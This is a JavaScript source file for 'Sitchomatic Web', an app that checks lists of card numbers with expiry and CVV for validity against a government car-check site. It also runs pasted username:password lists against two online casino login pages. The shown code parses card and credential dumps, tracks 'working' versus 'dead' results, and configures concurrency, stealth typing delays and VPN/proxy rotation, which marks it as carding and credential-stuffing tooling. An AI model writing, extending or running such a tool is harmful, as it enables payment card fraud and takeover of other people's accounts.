/**
 * @fileoverview Sitchomatic Web v1.2 — Main application module.
 * Manages PPSR card checking, Joe Fortune login checking, and Ignition Casino
 * login checking workflows. All data is persisted to localStorage. Supports
 * MediaRecorder run recordings, html2canvas debug screenshots (4 per check),
 * NordVPN WireGuard config management, and concurrent worker pools with
 * AbortController cancellation.
 *
 * Bug fixes applied in v1.2:
 *  BUG-01 parseCredLine space separator missing
 *  BUG-02 importCredSite null guard missing
 *  BUG-03 screenshot taken before status update
 *  BUG-04 catch blocks leave items in TESTING state
 *  BUG-05 detectIP re-shows banner after dismiss
 *  BUG-06 stopRun never resets abortController
 *  BUG-07 renderAll called on every worker iteration
 *  BUG-08 recording stop fire-and-forget race
 *  BUG-09 simulateLogin uses display name in seed
 *  BUG-10 captureDebugScreenshot shows app UI not result
 *  BUG-11 sanitizeFilenamePart duplicated
 *  BUG-12 AbortSignal.timeout Safari <16 crash
 *  BUG-13 saveDebugShots inner catch unguarded
 *  BUG-14 maskedNumber returns wrong result for 9-digit cards
 *  BUG-15 testHistory field naming inconsistency (documented)
 *  BUG-16 activity log not persisted
 *  BUG-17 IP banner shows non-IP strings
 *  BUG-18 exportAllCredsBtn label mismatch
 *  BUG-19 dead CSS rule (fixed in style.css)
 *  BUG-20 tab panel height ignores IP banner (fixed in style.css)
 *  BUG-21 parseCardLine accepts non-numeric card numbers
 *  BUG-22 detectIP banner reappear (duplicate of BUG-05)
 */

// ── Imports ────────────────────────────────────────────────
import { createRecordingArtifact, formatBytes, getRecordingsButtonLabel, sanitizeFilenamePart } from './recording-utils.js';
import { getLoginUrl, JOE_LOGIN_URL, IGNITION_LOGIN_URL } from './run-config.js';

// ── Storage keys ───────────────────────────────────────────
/** @constant {string} localStorage key for PPSR cards array. */
const KEY_CARDS      = 'sitcho_cards';
/** @constant {string} localStorage key for session history array. */
const KEY_SESSIONS   = 'sitcho_sessions';
/** @constant {string} localStorage key for user settings object. */
const KEY_SETTINGS   = 'sitcho_settings';
/** @constant {string} localStorage key for Grok AI API key. */
const KEY_GROK_API   = 'sitcho_grok_api';
/** @constant {string} localStorage key for Joe Fortune credentials array. */
const KEY_JOE_CREDS  = 'sitcho_joe_creds';
/** @constant {string} localStorage key for Ignition Casino credentials array. */
const KEY_IGN_CREDS  = 'sitcho_ign_creds';
/** @constant {string} localStorage key for debug screenshot array. */
const KEY_DEBUG_SHOTS = 'sitcho_debug_shots';
/** @constant {string} localStorage key for activity log array. */
const KEY_ACTIVITY   = 'sitcho_activity';
/** @constant {string} localStorage key for WireGuard config array. */
const KEY_WG_CONFIGS = 'sitcho_wg_configs';
/** @constant {string} localStorage key for NordLynx access key string. */
const KEY_NORD_KEY   = 'sitcho_nord_key';
/** @constant {string} localStorage key for the blacklist of known-disabled/no-acc usernames. */
const KEY_BLACKLIST  = 'sitcho_blacklist';
/** @constant {string} localStorage key for Joe Fortune recorded flow selectors. */
const KEY_JOE_FLOW   = 'sitcho_joe_flow';
/** @constant {string} localStorage key for Ignition recorded flow selectors. */
const KEY_IGN_FLOW   = 'sitcho_ign_flow';

// ── Card status enum ───────────────────────────────────────
/**
 * @enum {string} Status values for PPSR cards.
 * testHistory entries use the field name `result` (not `status`).
 */
const Status = {
  UNTESTED: 'untested',
  TESTING:  'testing',
  WORKING:  'working',
  DEAD:     'dead',
};

// ── Credential status enum ─────────────────────────────────
/**
 * @enum {string} Status values for login credentials.
 * testHistory entries use the field name `status` (not `result`).
 * This is intentionally different from card testHistory to match
 * the iOS LoginAttemptStatus enum naming.
 */
const CredStatus = {
  UNTESTED:      'untested',
  TESTING:       'testing',
  WORKING:       'working',
  NO_ACC:        'noAcc',
  PERM_DISABLED: 'permDisabled',
  TEMP_DISABLED: 'tempDisabled',
};

// ── Card brand detection ───────────────────────────────────
/**
 * Detects the card brand from a card number string using BIN prefix matching.
 * @param {string} num - Raw card number (may include non-digit chars).
 * @returns {{ name: string, icon: string }} Brand name and emoji icon.
 */
function detectBrand(num) {
  const n = num.replace(/\D/g, '');
  if (/^4/.test(n))              return { name: 'Visa',       icon: '💳' };
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return { name: 'Mastercard', icon: '🟠' };
  if (/^3[47]/.test(n))         return { name: 'Amex',       icon: '🟦' };
  if (/^6/.test(n))              return { name: 'Discover',   icon: '🔶' };
  return { name: 'Card', icon: '💳' };
}

// ── Card parse ─────────────────────────────────────────────
/**
 * Parses a single line of text into a card object.
 * Accepts separators: pipe, space, slash. Validates card number length (13–19 digits).
 * Returns null for any line that cannot be parsed into 4 valid parts.
 * BUG-21: validates that the card number contains only digits after stripping spaces/hyphens.
 * @param {string} line - A single line from a pasted or imported card list.
 * @returns {{ id: string, number: string, mm: string, yy: string, cvv: string, brand: string, brandIcon: string, status: string, successCount: number, totalTests: number, lastTested: number|null, testHistory: Array, addedAt: number }|null}
 *   Parsed card object, or null if the line is invalid.
 */
function parseCardLine(line) {
  line = line.trim();
  if (!line) return null;
  const parts = line.split(/[|\s\/]+/).map(p => p.trim()).filter(Boolean);
  if (parts.length < 4) return null;
  const [rawNum, rawMM, rawYY, rawCVV] = parts;
  const cleaned = rawNum.replace(/[\s-]/g, '');
  if (!/^\d+$/.test(cleaned)) return null;
  const num = cleaned;
  if (num.length < 13 || num.length > 19) return null;
  const mm = rawMM.replace(/\D/g, '').padStart(2, '0');
  let yy = rawYY.replace(/\D/g, '');
  if (yy.length === 4) yy = yy.slice(-2);
  const cvv = rawCVV.replace(/\D/g, '');
  if (!mm || !yy || !cvv) return null;
  const brand = detectBrand(num);
  return {
    id: crypto.randomUUID(),
    number: num, mm, yy, cvv,
    brand: brand.name, brandIcon: brand.icon,
    status: Status.UNTESTED,
    successCount: 0, totalTests: 0,
    lastTested: null, testHistory: [],
    addedAt: Date.now(),
  };
}

/**
 * Parses a multi-line text block into an array of card objects.
 * Each non-empty line is passed through parseCardLine; invalid lines are silently skipped.
 * @param {string} text - Multi-line text containing one card per line.
 * @returns {Array} Array of parsed card objects.
 */
function smartParseCards(text) {
  return text.split(/\n/).map(parseCardLine).filter(Boolean);
}

/**
 * Serialises a card object to the pipe-delimited format used for export and clipboard copy.
 * @param {{ number: string, mm: string, yy: string, cvv: string }} c - Card object.
 * @returns {string} Pipe-delimited string, e.g. "5123456789012346|08|26|123".
 */
function cardPipe(c) {
  return `${c.number}|${c.mm}|${c.yy}|${c.cvv}`;
}

/**
 * Returns a masked representation of a card number for safe display.
 * Shows the first 6 and last 4 digits with bullet characters in between.
 * BUG-14 fix: correctly handles cards with 9 or fewer digits (returns as-is)
 * and uses Math.max(0, ...) to prevent negative repeat counts.
 * @param {string} num - Raw card number digits.
 * @returns {string} Masked display string.
 */
function maskedNumber(num) {
  if (num.length <= 9) return num;
  return num.slice(0, 6) + '•'.repeat(Math.max(0, num.length - 10)) + num.slice(-4);
}

// ── Credential parse ───────────────────────────────────────
/**
 * Parses a single credential line into a credential object.
 * Tries separators in order: colon, pipe, semicolon, comma, tab, space (BUG-01 fix).
 * For space, uses the first whitespace run as the separator.
 * Returns null for comment lines (starting with #) or lines where no separator is found.
 * @param {string} line - A single line from pasted or imported credential text.
 * @returns {{ id: string, username: string, password: string, status: string, addedAt: number, testHistory: Array }|null}
 *   Parsed credential object, or null if the line cannot be parsed.
 */
function parseCredLine(line) {
  line = line.trim();
  if (!line || line.startsWith('#')) return null;
  const seps = [':', '|', ';', ',', '\t', ' '];
  for (const sep of seps) {
    const idx = sep === ' ' ? line.search(/\s+/) : line.indexOf(sep);
    if (idx > 0) {
      const username = line.slice(0, idx).trim();
      const password = sep === ' '
        ? line.slice(idx).trim().replace(/^\s+/, '')
        : line.slice(idx + 1).trim();
      if (username.length >= 3 && password.length >= 1) {
        return {
          id: crypto.randomUUID(),
          username, password,
          status: CredStatus.UNTESTED,
          addedAt: Date.now(),
          testHistory: [],
        };
      }
    }
  }
  return null;
}

/**
 * Parses a multi-line text block into an array of credential objects.
 * @param {string} text - Multi-line text with one credential per line.
 * @returns {Array} Array of parsed credential objects.
 */
function smartParseCreds(text) {
  return text.split(/\n/).map(parseCredLine).filter(Boolean);
}

/**
 * Returns the colon-delimited label for a credential (used for export and clipboard).
 * @param {{ username: string, password: string }} cred - Credential object.
 * @returns {string} Label string, e.g. "user@email.com:password123".
 */
function credLabel(cred) {
  return `${cred.username}:${cred.password}`;
}

/**
 * Returns a human-readable label for a credential status enum value.
 * @param {string} s - A CredStatus enum value.
 * @returns {string} Display label such as "Working", "No Acc", "Temp Disabled".
 */
function credStatusLabel(s) {
  switch (s) {
    case CredStatus.WORKING:       return 'Working';
    case CredStatus.NO_ACC:        return 'No Acc';
    case CredStatus.PERM_DISABLED: return 'Perm Disabled';
    case CredStatus.TEMP_DISABLED: return 'Temp Disabled';
    case CredStatus.TESTING:       return 'Testing';
    default:                       return 'Untested';
  }
}

/**
 * Returns the CSS class modifier for a credential status enum value.
 * Used to colour status badges via `status-badge <class>`.
 * @param {string} s - A CredStatus enum value.
 * @returns {string} CSS class name suffix.
 */
function credStatusClass(s) {
  switch (s) {
    case CredStatus.WORKING:       return 'working';
    case CredStatus.NO_ACC:        return 'dead';
    case CredStatus.PERM_DISABLED: return 'dead';
    case CredStatus.TEMP_DISABLED: return 'error';
    case CredStatus.TESTING:       return 'testing';
    default:                       return 'untested';
  }
}


// ── WireGuard Config Parser ────────────────────────────────
/**
 * Parses a WireGuard .conf file content into a structured config object.
 * Supports [Interface] and [Peer] sections as per the WireGuard standard.
 * Returns null if the config is missing required fields (PrivateKey, PublicKey, Endpoint).
 * @param {string} fileName - Original filename (used for display and dedup).
 * @param {string} content - Raw text content of the .conf file.
 * @returns {{ id: string, fileName: string, interfaceAddress: string, interfacePrivateKey: string, interfaceDNS: string, interfaceMTU: number|null, peerPublicKey: string, peerPreSharedKey: string|null, peerEndpoint: string, peerAllowedIPs: string, peerPersistentKeepalive: number|null, rawContent: string, isEnabled: boolean, importedAt: number, endpointHost: string, endpointPort: number }|null}
 */
function parseWireGuardConf(fileName, content) {
  const lines = content.split(/\n/);
  let address = '', privateKey = '', dns = '', mtu = null;
  let publicKey = '', preSharedKey = null, endpoint = '', allowedIPs = '0.0.0.0/0', keepalive = null;
  let inInterface = false, inPeer = false;
  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line || line.startsWith('#') || line.startsWith(';')) continue;
    const lower = line.toLowerCase();
    if (lower === '[interface]' || lower.startsWith('[interface]')) { inInterface = true; inPeer = false; continue; }
    if (lower === '[peer]' || lower.startsWith('[peer]')) { inInterface = false; inPeer = true; continue; }
    const eqIdx = line.indexOf('=');
    if (eqIdx === -1) continue;
    const key = line.slice(0, eqIdx).trim().toLowerCase();
    const value = line.slice(eqIdx + 1).trim();
    if (!value) continue;
    if (inInterface) {
      if (key === 'address') address = value;
      else if (key === 'privatekey') privateKey = value;
      else if (key === 'dns') dns = value;
      else if (key === 'mtu') mtu = parseInt(value) || null;
    } else if (inPeer) {
      if (key === 'publickey') publicKey = value;
      else if (key === 'presharedkey') preSharedKey = value;
      else if (key === 'endpoint') endpoint = value;
      else if (key === 'allowedips') allowedIPs = value;
      else if (key === 'persistentkeepalive') keepalive = parseInt(value) || null;
    }
  }
  if (!privateKey || !publicKey || !endpoint) return null;
  if (!address) address = '10.5.0.2/32';
  const lastColon = endpoint.lastIndexOf(':');
  const endpointHost = lastColon > 0 ? endpoint.slice(0, lastColon) : endpoint;
  const endpointPort = lastColon > 0 ? (parseInt(endpoint.slice(lastColon + 1)) || 51820) : 51820;
  return {
    id: crypto.randomUUID(),
    fileName,
    interfaceAddress: address,
    interfacePrivateKey: privateKey,
    interfaceDNS: dns,
    interfaceMTU: mtu,
    peerPublicKey: publicKey,
    peerPreSharedKey: preSharedKey,
    peerEndpoint: endpoint,
    peerAllowedIPs: allowedIPs,
    peerPersistentKeepalive: keepalive,
    rawContent: content,
    isEnabled: true,
    importedAt: Date.now(),
    endpointHost,
    endpointPort,
  };
}

// ── App State ──────────────────────────────────────────────
/**
 * @type {object} Global application state. Mutated in place throughout the app.
 * Never assigned a new object reference after boot — always mutate properties.
 */
let state = {
  /** @type {Array} PPSR card objects. */
  cards: [],
  /** @type {Array} Session history records. */
  sessions: [],
  /** @type {Array} Activity feed entries (persisted, max 100). */
  activity: [],
  /** @type {Array} Run recording artifacts (in-memory only, lost on reload). */
  recordings: [],
  /** @type {Array} Debug screenshot objects (persisted until cleared). */
  debugShots: [],
  /** @type {Array} Joe Fortune credential objects. */
  joeCreds: [],
  /** @type {Array} Ignition Casino credential objects. */
  ignCreds: [],
  /** @type {Array} WireGuard config objects parsed from imported .conf files. */
  wireGuardConfigs: [],
  /** @type {Array<{id:string, username:string, ts:number, note:string}>} Blacklisted usernames — auto-marked as Perm Disabled on import. */
  blacklist: [],
  /**
   * @type {string[]|null} Recorded CSS selectors for Joe Fortune login flow.
   * Index 0 = cookie dismiss, 1 = email field, 2 = password field, 3 = submit button.
   */
  joeFlow: null,
  /**
   * @type {string[]|null} Recorded CSS selectors for Ignition login flow.
   * Index 0 = cookie dismiss, 1 = email field, 2 = password field, 3 = submit button.
   */
  ignFlow: null,
  /** @type {string} NordLynx access key (persisted). */
  nordAccessKey: '',
  /** @type {object} User-configurable settings. */
  settings: {
    // PPSR
    maxConcurrency: 7,
    checkTimeout: 180,
    autoRetry: true,
    stealthMode: false,
    debugScreenshots: true,
    ppsrUrl: 'https://transact.ppsr.gov.au/CarCheck/',
    // Target login URLs (editable in Settings → Target URLs)
    joeLoginUrl: 'https://joefortunepokies.win/login',
    ignitionLoginUrl: 'https://ignitioncasino.ooo/login',
    // Login checker
    loginConcurrency: 3,
    loginTimeout: 60,
    testEmail: '',
    useEmailRotation: false,
    // Automation
    typingSpeedMinMs: 50,
    typingSpeedMaxMs: 150,
    requeueOnTimeout: true,
    requeueOnFailure: true,
    maxRequeueCount: 3,
    batchDelayBetweenStartsMs: 50,
    pageLoadTimeout: 180,
    // Network / VPN
    vpnRotation: false,
    dnsRotation: false,
    proxyRotateOnFailure: true,
    // Appearance
    theme: 'dark',
  },
  /** @type {string} Grok AI API key (persisted separately). */
  grokKey: '',
  /** @type {boolean} True while PPSR run is active. */
  isRunning: false,
  /** @type {boolean} True while Joe Fortune login run is active. */
  joeRunning: false,
  /** @type {boolean} True while Ignition login run is active. */
  ignRunning: false,
  /** @type {string} ID of the currently active tab panel. */
  activeTab: 'dashboard',
  /** @type {string} Current filter applied to the sessions list. */
  sessionFilter: 'all',
  /** @type {string} Current filter for Joe credentials list. */
  joeFilter: 'all',
  /** @type {string} Current filter for Ignition credentials list. */
  ignFilter: 'all',
  /** @type {Set<string>} IDs of selected cards. */
  selectedCardIds: new Set(),
  /** @type {Set<string>} IDs of selected Joe credentials. */
  selectedJoeIds: new Set(),
  /** @type {Set<string>} IDs of selected Ignition credentials. */
  selectedIgnIds: new Set(),
  /** @type {string|null} ID of the card currently shown in the detail modal. */
  detailCardId: null,
  /** @type {string|null} Site ('joe'|'ign') of the credential in the detail modal. */
  detailCredSite: null,
  /** @type {string|null} ID of the credential currently shown in the detail modal. */
  detailCredId: null,
  /** @type {string|null} Site ('joe'|'ign') for the currently open import credential modal. */
  importCredSite: null,
  /** @type {Function|null} Callback to invoke when the confirm modal OK button is pressed. */
  confirmCallback: null,
  /** @type {AbortController|null} Active AbortController for the PPSR run. */
  abortController: null,
  /** @type {AbortController|null} Active AbortController for the Joe run. */
  joeAbortController: null,
  /** @type {AbortController|null} Active AbortController for the Ignition run. */
  ignAbortController: null,
  /** @type {boolean} Suppresses repeat "screenshot engine unavailable" toasts. */
  screenshotEngineUnavailableNotified: false,
  /** @type {object|null} Active recording session data, or null when not recording. */
  recordingActive: null,
  /** @type {boolean} Suppresses repeat "recording engine unavailable" toasts. */
  recordingEngineUnavailableNotified: false,
};

// ── Persistence ─────────────────────────────────────────────
/** @description Serialises and saves the cards array to localStorage. */
function saveCards()    { localStorage.setItem(KEY_CARDS, JSON.stringify(state.cards)); }
/** @description Serialises and saves the sessions array (max 1000 entries) to localStorage. */
function saveSessions() { localStorage.setItem(KEY_SESSIONS, JSON.stringify(state.sessions.slice(0, 1000))); }
/** @description Serialises and saves the settings object to localStorage. */
function saveSettings() { localStorage.setItem(KEY_SETTINGS, JSON.stringify(state.settings)); }
/** @description Serialises and saves the Joe Fortune credentials array to localStorage. */
function saveJoeCreds() { localStorage.setItem(KEY_JOE_CREDS, JSON.stringify(state.joeCreds)); }
/** @description Serialises and saves the Ignition Casino credentials array to localStorage. */
function saveIgnCreds() { localStorage.setItem(KEY_IGN_CREDS, JSON.stringify(state.ignCreds)); }
/** @description Serialises and saves the activity log (max 100 entries) to localStorage. */
function saveActivity() {
  try { localStorage.setItem(KEY_ACTIVITY, JSON.stringify(state.activity.slice(0, 100))); } catch {}
}
/** @description Serialises and saves WireGuard configs to localStorage. */
function saveWgConfigs() {
  try { localStorage.setItem(KEY_WG_CONFIGS, JSON.stringify(state.wireGuardConfigs)); } catch {}
}
/** @description Saves the NordLynx access key to localStorage. */
function saveNordKey() {
  try {
    if (state.nordAccessKey) localStorage.setItem(KEY_NORD_KEY, state.nordAccessKey);
    else localStorage.removeItem(KEY_NORD_KEY);
  } catch {}
}

/**
 * Saves the blacklist to localStorage.
 * The blacklist is an array of {id, username, ts, note} objects representing
 * known-bad usernames that should be auto-marked as Perm Disabled on import.
 */
function saveBlacklist() {
  try { localStorage.setItem(KEY_BLACKLIST, JSON.stringify(state.blacklist)); } catch {}
}

/**
 * Returns true if the given username exists in the blacklist (case-insensitive).
 * @param {string} username - The username/email to look up.
 * @returns {boolean}
 */
function isBlacklisted(username) {
  const u = (username || '').toLowerCase().trim();
  return state.blacklist.some(b => (b.username || '').toLowerCase().trim() === u);
}

/**
 * Saves debug screenshots to localStorage with recursive quota-safe trimming.
 * BUG-13 fix: if the first setItem throws a quota error, trims the array by 25%
 * and retries recursively until it fits, rather than silently failing.
 * @description Persists state.debugShots to localStorage, trimming if needed.
 */
function saveDebugShotsQuota() {
  while (state.debugShots.length > 0) {
    try {
      localStorage.setItem(KEY_DEBUG_SHOTS, JSON.stringify(state.debugShots));
      return;
    } catch {
      const trimTo = Math.floor(state.debugShots.length * 0.75);
      if (trimTo <= 0) break;
      state.debugShots = state.debugShots.slice(0, trimTo);
    }
  }
  try { localStorage.removeItem(KEY_DEBUG_SHOTS); } catch {}
}

/**
 * Loads all persisted data from localStorage into state.
 * Merges saved settings over defaults (so new settings fields get default values).
 * BUG-16 fix: loads activity log from localStorage.
 * Removes the 12-screenshot cap (screenshots now persist until cleared).
 */
function loadAll() {
  try { state.cards         = JSON.parse(localStorage.getItem(KEY_CARDS))      || []; } catch { state.cards = []; }
  try { state.sessions      = JSON.parse(localStorage.getItem(KEY_SESSIONS))   || []; } catch { state.sessions = []; }
  try { state.debugShots    = JSON.parse(localStorage.getItem(KEY_DEBUG_SHOTS)) || []; } catch { state.debugShots = []; }
  try { state.joeCreds      = JSON.parse(localStorage.getItem(KEY_JOE_CREDS))  || []; } catch { state.joeCreds = []; }
  try { state.ignCreds      = JSON.parse(localStorage.getItem(KEY_IGN_CREDS))  || []; } catch { state.ignCreds = []; }
  try { state.activity      = JSON.parse(localStorage.getItem(KEY_ACTIVITY))   || []; } catch { state.activity = []; }
  try { state.wireGuardConfigs = JSON.parse(localStorage.getItem(KEY_WG_CONFIGS)) || []; } catch { state.wireGuardConfigs = []; }
  try { state.blacklist        = JSON.parse(localStorage.getItem(KEY_BLACKLIST))   || []; } catch { state.blacklist = []; }
  try { state.joeFlow          = JSON.parse(localStorage.getItem(KEY_JOE_FLOW))    || null; } catch { state.joeFlow = null; }
  try { state.ignFlow          = JSON.parse(localStorage.getItem(KEY_IGN_FLOW))    || null; } catch { state.ignFlow = null; }
  state.nordAccessKey = localStorage.getItem(KEY_NORD_KEY) || '';
  try {
    const s = JSON.parse(localStorage.getItem(KEY_SETTINGS));
    if (s) state.settings = { ...state.settings, ...s };
  } catch {}
  if (typeof state.settings.debugScreenshots !== 'boolean') state.settings.debugScreenshots = true;
  if (!Array.isArray(state.debugShots)) state.debugShots = [];
  state.grokKey = localStorage.getItem(KEY_GROK_API) || '';
}

// ── DOM refs ────────────────────────────────────────────────
/**
 * Returns a DOM element by ID. Shorthand for document.getElementById.
 * @param {string} id - Element ID.
 * @returns {HTMLElement|null} The element, or null if not found.
 */
const $ = id => document.getElementById(id);

/**
 * Returns the first element matching a CSS selector within an optional context.
 * @param {string} sel - CSS selector.
 * @param {Element|Document} [ctx=document] - Search root.
 * @returns {Element|null} First matching element, or null.
 */
const $q = (sel, ctx = document) => ctx.querySelector(sel);

/**
 * Returns all elements matching a CSS selector within an optional context, as an Array.
 * @param {string} sel - CSS selector.
 * @param {Element|Document} [ctx=document] - Search root.
 * @returns {Array<Element>} Array of matching elements.
 */
const $all = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));

// ── Toast notification ─────────────────────────────────────
/**
 * Displays a brief floating toast message in the bottom-right corner.
 * Automatically fades out and removes itself after the given duration.
 * @param {string} msg - Message text to display.
 * @param {'info'|'success'|'error'} [type='info'] - Visual style variant.
 * @param {number} [dur=2800] - Time in milliseconds before the toast fades.
 */
function toast(msg, type = 'info', dur = 2800) {
  const c = $('toastContainer');
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.textContent = msg;
  c.appendChild(el);
  setTimeout(() => {
    el.classList.add('fadeout');
    setTimeout(() => el.remove(), 300);
  }, dur);
}

// ── Tab switching ──────────────────────────────────────────
/**
 * Switches the visible tab panel and updates the active tab button state.
 * Calls renderAll() after switching to ensure content is up-to-date.
 * @param {string} name - Tab identifier matching `data-tab` attributes and `tab-${name}` panel IDs.
 */
function switchTab(name) {
  state.activeTab = name;
  $all('.tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
  $all('.tab-panel').forEach(p => p.classList.toggle('active', p.id === `tab-${name}`));
  renderAll();
}
window.switchTab = switchTab;

// ── Theme ──────────────────────────────────────────────────
/**
 * Applies the given theme to the document and updates the theme toggle button icon.
 * Handles the 'system' pseudo-theme by querying the OS colour scheme preference.
 * Also updates segmented control button active state in the settings panel.
 * @param {'light'|'dark'|'system'} t - The theme to apply.
 */
function applyTheme(t) {
  const pref = t === 'system'
    ? (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark')
    : t;
  document.documentElement.dataset.theme = pref;
  $('themeToggle').textContent = pref === 'dark' ? '☀️' : '🌙';
  $all('.seg-btn[data-theme]').forEach(b => b.classList.toggle('active', b.dataset.theme === t));
}

// ── Stats ───────────────────────────────────────────────────
/**
 * Computes aggregate counts for the PPSR cards collection.
 * @returns {{ total: number, working: number, dead: number, untested: number, testing: number, tested: number, rate: number }}
 *   Object with count fields. `rate` is the success rate (0–1) among tested cards.
 */
function stats() {
  const total    = state.cards.length;
  const working  = state.cards.filter(c => c.status === Status.WORKING).length;
  const dead     = state.cards.filter(c => c.status === Status.DEAD).length;
  const testing  = state.cards.filter(c => c.status === Status.TESTING).length;
  const untested = state.cards.filter(c => c.status === Status.UNTESTED).length;
  const tested   = working + dead + testing;
  const rate     = tested > 0 ? working / tested : 0;
  return { total, working, dead, untested, testing, tested, rate };
}


// ── Debounced render scheduler (BUG-07) ───────────────────
/** @type {boolean} True when a renderAll RAF is already scheduled. */
let _renderPending = false;

/**
 * Schedules a renderAll call via requestAnimationFrame, coalescing multiple
 * rapid calls into a single render cycle.
 * BUG-07 fix: replaces direct renderAll() calls inside worker loops to prevent
 * ~700 synchronous renders on a 100-item run with 7 workers.
 */
function scheduleRender() {
  if (_renderPending) return;
  _renderPending = true;
  requestAnimationFrame(() => { _renderPending = false; renderAll(); });
}

// ── Render Dashboard ───────────────────────────────────────
/**
 * Re-renders the dashboard tab panel: stat counters, run rate progress bar,
 * run/stop button visibility, login summary counts, and recent activity feed.
 */
function renderDashboard() {
  const s = stats();
  $('statTotal').textContent    = s.total;
  $('statWorking').textContent  = s.working;
  $('statDead').textContent     = s.dead;
  $('statUntested').textContent = s.untested;

  const pct = Math.round(s.rate * 100);
  $('ratePct').textContent = pct + '%';
  $('progressFill').style.width = pct + '%';
  $('rateSub').textContent = s.tested > 0
    ? `${s.working} of ${s.tested} tested (${s.untested} untested)`
    : 'No cards tested yet';

  const dot = $('statusDot');
  dot.className = 'status-dot' + (state.isRunning ? ' running' : '');
  $('statusLabel').textContent = state.isRunning ? 'Running' : 'Idle';
  const tc = $('testingCount');
  if (s.testing > 0 && state.isRunning) {
    tc.textContent = `· ${s.testing} checking`;
    tc.classList.remove('hidden');
  } else { tc.classList.add('hidden'); }

  $('runStatus').textContent = (state.isRunning || state.joeRunning || state.ignRunning) ? '● Running' : '● Idle';
  $('runStatus').className   = 'status-pill ' + ((state.isRunning || state.joeRunning || state.ignRunning) ? 'running' : 'idle');
  $('runBtn').classList.toggle('hidden', state.isRunning || s.untested === 0);
  $('stopBtn').classList.toggle('hidden', !state.isRunning);
  $('emptyDash').classList.toggle('hidden', s.total > 0 || state.joeCreds.length > 0 || state.ignCreds.length > 0);

  const joeWorking = state.joeCreds.filter(c => c.status === CredStatus.WORKING).length;
  const ignWorking = state.ignCreds.filter(c => c.status === CredStatus.WORKING).length;
  $('dashJoeWorking').textContent = joeWorking;
  $('dashIgnWorking').textContent = ignWorking;
  $('dashJoeTotal').textContent   = state.joeCreds.length;
  $('dashIgnTotal').textContent   = state.ignCreds.length;

  const al = $('recentActivity');
  if (state.activity.length === 0) {
    al.innerHTML = '<div class="empty-row">No activity yet</div>';
  } else {
    al.innerHTML = state.activity.slice(0, 30).map(a => `
      <div class="activity-row">
        <span class="activity-icon">${a.icon}</span>
        <div class="activity-info">
          <div class="activity-card">${a.label}</div>
          <div class="activity-detail">${a.detail}</div>
        </div>
        <span class="activity-time">${timeAgo(a.ts)}</span>
      </div>`).join('');
  }
}

// ── Render Cards ───────────────────────────────────────────
/**
 * Re-renders the Cards tab: title count, card list items with status badges,
 * and the batch action bar (visible only when cards are selected).
 */
function renderCards() {
  const s = stats();
  $('cardsTitle').textContent = `Cards (${s.total})`;
  updateBadge('cardsBadge', s.total);

  const list  = $('cardList');
  const empty = $('cardListEmpty');
  if (state.cards.length === 0) {
    empty.classList.remove('hidden');
    list.innerHTML = '';
    list.classList.add('hidden');
    $('batchBar').classList.add('hidden');
    return;
  }
  empty.classList.add('hidden');
  list.classList.remove('hidden');

  list.innerHTML = state.cards.map(c => {
    const sel = state.selectedCardIds.has(c.id);
    return `
    <li class="card-item${sel ? ' selected' : ''}${c.status === Status.TESTING ? ' checking' : ''}" data-id="${c.id}">
      <div class="card-checkbox" data-check="${c.id}">${sel ? '✓' : ''}</div>
      <div class="card-brand-icon">${c.brandIcon}</div>
      <div class="card-info">
        <div class="card-number">${maskedNumber(c.number)}</div>
        <div class="card-meta">
          <span>${c.mm}/${c.yy}</span>
          <span>CVV ${c.cvv}</span>
          <span>${c.brand}</span>
        </div>
      </div>
      <div class="card-right">
        <span class="status-badge ${c.status}">${c.status}</span>
        ${c.totalTests > 0 ? `<span class="card-tests">${c.successCount}/${c.totalTests}</span>` : ''}
      </div>
    </li>`;
  }).join('');

  const nSel = state.selectedCardIds.size;
  $('batchBar').classList.toggle('hidden', nSel === 0);
  $('selectedCount').textContent = nSel > 0 ? `${nSel} selected` : '';
  $('checkSelectedBtn').textContent = `▶ Check Selected (${nSel})`;
}

// ── Render Working ─────────────────────────────────────────
/**
 * Re-renders the Working tab: shows only cards with WORKING status.
 * Each item is clickable to copy its pipe-delimited format to the clipboard.
 */
function renderWorking() {
  const working = state.cards.filter(c => c.status === Status.WORKING);
  $('workingTitle').textContent = `Working (${working.length})`;
  updateBadge('workingBadge', working.length);

  const list  = $('workingList');
  const empty = $('workingEmpty');
  if (working.length === 0) {
    empty.classList.remove('hidden');
    list.innerHTML = '';
    return;
  }
  empty.classList.add('hidden');
  list.innerHTML = working.map(c => `
    <li class="card-item" data-id="${c.id}" title="Click to copy">
      <div class="card-brand-icon">${c.brandIcon}</div>
      <div class="card-info">
        <div class="card-number">${cardPipe(c)}</div>
        <div class="card-meta">
          <span>${c.brand}</span><span>${c.mm}/${c.yy}</span><span>CVV ${c.cvv}</span>
        </div>
      </div>
      <div class="card-right">
        <span class="status-badge working">working</span>
        ${c.totalTests > 0 ? `<span class="card-tests">${c.successCount}/${c.totalTests}</span>` : ''}
      </div>
    </li>`).join('');
}

// ── Render Joe / Ignition (shared helper) ─────────────────
/**
 * Re-renders the credential list for either the Joe Fortune or Ignition tab.
 * Applies the current filter (all / untested / working / noAcc / disabled).
 * Updates run/stop button visibility, stat counters, and the batch action bar.
 * @param {'joe'|'ign'} site - Which site's credential list to render.
 */
function renderCredSite(site) {
  const creds     = site === 'joe' ? state.joeCreds : state.ignCreds;
  const filter    = site === 'joe' ? state.joeFilter : state.ignFilter;
  const selIds    = site === 'joe' ? state.selectedJoeIds : state.selectedIgnIds;
  const isRunning = site === 'joe' ? state.joeRunning : state.ignRunning;
  const prefix    = site === 'joe' ? 'joe' : 'ign';
  const badgeId   = site === 'joe' ? 'joeBadge' : 'ignitionBadge';

  const total    = creds.length;
  const working  = creds.filter(c => c.status === CredStatus.WORKING).length;
  const noAcc    = creds.filter(c => c.status === CredStatus.NO_ACC || c.status === CredStatus.PERM_DISABLED).length;
  const disabled = creds.filter(c => c.status === CredStatus.TEMP_DISABLED).length;
  const untested = creds.filter(c => c.status === CredStatus.UNTESTED).length;

  $(`${prefix}StatTotal`).textContent    = total;
  $(`${prefix}StatWorking`).textContent  = working;
  $(`${prefix}StatNoAcc`).textContent    = noAcc;
  $(`${prefix}StatDisabled`).textContent = disabled;
  updateBadge(badgeId, working);

